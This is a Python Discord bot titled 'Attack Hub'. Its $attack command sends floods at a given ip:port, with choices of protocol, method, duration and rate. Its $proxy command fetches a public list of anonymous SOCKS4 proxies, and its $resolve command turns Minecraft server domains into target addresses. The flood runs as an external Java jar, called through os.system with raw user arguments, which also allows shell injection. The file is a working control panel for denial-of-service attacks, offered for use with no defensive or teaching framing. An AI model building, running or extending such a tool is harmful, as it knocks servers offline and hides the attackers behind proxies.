import discord
from discord.ext import commands
import os
import threading
import requests
import urllib.request
import json
import asyncio
import sqlite3
import psutil
import datetime
from discord import utils
from discord.utils import get
from psutil import Process, virtual_memory

token = "Токенбота"

client = commands.Bot(command_prefix='$')
client.remove_command('help')


@client.command()
@commands.has_any_role('🌀  Son')
async def proxy(ctx):
    def update():
        os.system(
            f"curl -o proxies.txt https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/socks4.txt")
        os.system(f"")

    t1 = threading.Thread(target=update)

    t1.start()

    await ctx.send("Proxy Updated")


@client.command()
@commands.has_any_role('🌀  Son')
@commands.cooldown(1, 1, commands.BucketType.user)
async def help(ctx):
    embed = discord.Embed(
        title="Attack Hub",
        color=discord.Colour.red()
    )
    embed.add_field(name='Attack', value='$attack <ip:port> <protocol> <method> <time> <cps>', inline=False)
    embed.add_field(name='Resolver', value='$resolve <domain>', inline=False)
    embed.add_field(name='Proxy Upd', value='$proxy', inline=False)
    embed.set_footer(text="Network")
    await ctx.send(embed=embed)
    

@client.command()
@commands.has_any_role('🌀  Son')
@commands.cooldown(1, 1, commands.BucketType.user)
async def resolve(ctx, arg1):
    url = "https://api.mcsrvstat.us/2/" + arg1
    file = urllib.request.urlopen(url)

    for line in file:
        decoded_line = line.decode("utf-8")

    json_object = json.loads(decoded_line)

    embed = discord.Embed(
        title="Resolved!",
        color=discord.Colour.red()
    )

    embed.add_field(name='IP:', value=json_object["ip"], inline=False)
    embed.add_field(name='Port:', value=json_object["port"], inline=False)

    g = json_object["ip"]
    gb = json_object["port"]

    embed.set_image(url=f'http://status.mclive.eu/storm/{g}/{gb}/banner.png')
    embed.set_footer(text="Network")
    await ctx.send(embed=embed)


@client.command()
@commands.has_any_role('🌀  Son')
@commands.cooldown(1, 1, commands.BucketType.user)
async def attack(ctx, arg1, arg2, arg3, arg4, arg5):
    def attack():
        os.system(
            f"java -jar index.jar {arg1} {arg2} {arg3} {arg4} {arg5}")
        os.system(f"")

    embed = discord.Embed(
        title='Sent attack...',
        description=f'Attack by {ctx.author.mention}',
        color=discord.Colour.red()
    )

    embed.add_field(name='Host:', value=f'{arg1}', inline=False)
    embed.add_field(name='Method:', value=f'{arg3}', inline=False)
    embed.add_field(name='Time', value=f'{arg4}', inline=False)
    embed.add_field(name='Cps:', value=f'{arg5}', inline=False) 
    embed.set_image(url=f'https://images-ext-2.discordapp.net/external/fpO1qMI3kRJeoa1sWT_yup1JKsdpmrGlPM_OA5BjkPY/https/i.imgur.com/Fn9HQ17.gif')
    embed.set_footer(text="Network")
    
    t1 = threading.Thread(target=attack)

    t1.start()

    await ctx.send(embed=embed)
    
client.run(token)
